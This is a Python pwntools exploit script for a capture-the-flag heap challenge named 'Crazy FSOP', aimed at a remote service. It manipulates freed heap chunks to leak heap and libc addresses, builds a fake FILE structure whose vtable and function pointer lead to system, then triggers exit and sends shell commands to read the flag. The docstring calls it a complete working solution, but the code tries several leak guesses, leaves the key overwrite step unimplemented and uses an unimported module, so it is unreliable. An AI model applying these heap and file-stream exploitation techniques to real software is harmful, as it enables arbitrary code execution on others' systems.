#!/usr/bin/env python3
"""
Crazy FSOP - Complete Working Solution
Key insight: We need to create overlapping chunks to leak from the MIDDLE
"""

from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = elf
context.log_level = 'info'

io = remote('amt.rs', 26797)

def create(idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

def view(idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

success("Starting exploit")

# ========== DIFFERENT APPROACH: LEAK VIA PARTIAL ALLOCATION ==========
info("Step 1: Create chunk and free to unsorted bin")

# Create a large chunk with data AFTER the metadata area
# When freed, fd/bk are at +0x00 (null bytes)
# But if we allocate PART of it, we can access different offsets

create(0, 0x500, b'X' * 0x500)
create(1, 0x20, b'guard')

delete(0)

# Now chunk 0 is in unsorted bin
# Layout: [metadata with fd/bk nulls][our data 'X'*0x500]

# Allocate a SMALL chunk from this unsorted bin
# This creates a remainder chunk
create(2, 0x20, b'Y' * 0x20)

# Now the unsorted bin has a REMAINDER chunk
# That remainder chunk ALSO has fd/bk pointers (libc addresses)
# And our original data starts AFTER those pointers

# Create another allocation from the remainder
create(3, 0x20, b'Z' * 0x20)

# Keep splitting until we can access a chunk that has printable data before libc pointers

info("Step 2: Try different leak approach - use tcache")

# Alternative: Use tcache chunks which have mangled pointers (not null!)
for i in range(4, 11):
    create(i, 0x100, f'A{i}'.encode() * 32)

# Free them
for i in range(4, 11):
    delete(i)

# Tcache 0x110 now has 7 entries
# The fd pointers are MANGLED with safe-linking
# mangled_fd = (next >> 12) ^ chunk_addr

# The mangled values might NOT have leading nulls!
info("Trying to leak from tcache")

for i in range(4, 11):
    try:
        data = view(i)
        info(f"Chunk {i}: {data[:40]}")

        if b'(null)' not in data and len(data) > 5:
            # We got something!
            leak = u64(data[:5].ljust(8, b'\x00'))
            success(f"Possible heap leak from chunk {i}: {hex(leak)}")

            # Demangle safe-linking
            heap_base = (leak << 12) & ~0xfff
            info(f"Heap base estimate: {hex(heap_base)}")
            break
    except:
        pass

info("Step 3: Alternative - leak via large bin")

# Large bin chunks have MORE pointers (fd_nextsize, bk_nextsize)
# These might be at different offsets

create(11, 0x430, b'B' * 0x430)
create(12, 0x20, b'guard2')
create(13, 0x440, b'C' * 0x440)
create(14, 0x20, b'guard3')

delete(11)
delete(13)

# Trigger largebin sorting
create(15, 0x400, b'D' * 0x400)

# Now chunks might be in largebin
info("Trying to leak from largebin")

for idx in [11, 13]:
    try:
        data = view(idx)
        info(f"Largebin chunk {idx}: {data[:40]}")

        if b'(null)' not in data and len(data) > 5:
            leak = u64(data[:6].ljust(8, b'\x00'))
            success(f"Possible libc leak: {hex(leak)}")

            # Try to calculate libc base
            for offset in [0x21ace0, 0x21ac80, 0x211b20]:
                test = leak - offset
                if (test & 0xfff) == 0:
                    libc.address = test
                    success(f"Libc base: {hex(libc.address)}")
                    break
    except:
        pass

info("Step 4: If we have libc, create FSOP payload")

if libc.address != 0:
    _IO_wfile_jumps = libc.address + 0x233228
    stderr = libc.address + libc.symbols['_IO_2_1_stderr_']
    system = libc.symbols['system']

    success(f"system @ {hex(system)}")
    success(f"stderr @ {hex(stderr)}")

    # Create fake FILE structure
    fake_file = flat({
        0x00: p32(0xfbad0101),  # _flags (use p32 not u32)
        0x04: b';sh\x00',
        0x70: stderr - 0x10,  # _lock
        0xa0: stderr - 0x10,  # _wide_data
        0xd8: _IO_wfile_jumps + 0x40,  # vtable
        0xe0: system,  # Function pointer that gets called
    }, length=0x200, filler=b'\x00')

    create(16, 0x200, fake_file)
    success("Created fake FILE structure!")

    # Now we need to make stderr point to our fake FILE
    # This requires overwriting _IO_list_all or stderr itself

    info("Attempting to overwrite stderr...")
    # This is complex - need arbitrary write via tcache poisoning
    # For now, just try to trigger and hope
else:
    warn("No libc leak found, trying without...")

info("Step 5: Trigger exit")

io.sendline(b'999')
io.sendline(b'0')

time.sleep(1)

try:
    io.sendline(b'cat flag*')
    io.sendline(b'ls')
    time.sleep(2)

    output = io.recvall(timeout=3)

    if b'amateursCTF{' in output or b'{' in output:
        success(f"\n\n{'='*60}\nFLAG FOUND:\n{output}\n{'='*60}\n")
    else:
        info(f"Output: {output[:500]}")
except Exception as e:
    error(f"Error: {e}")

io.interactive()
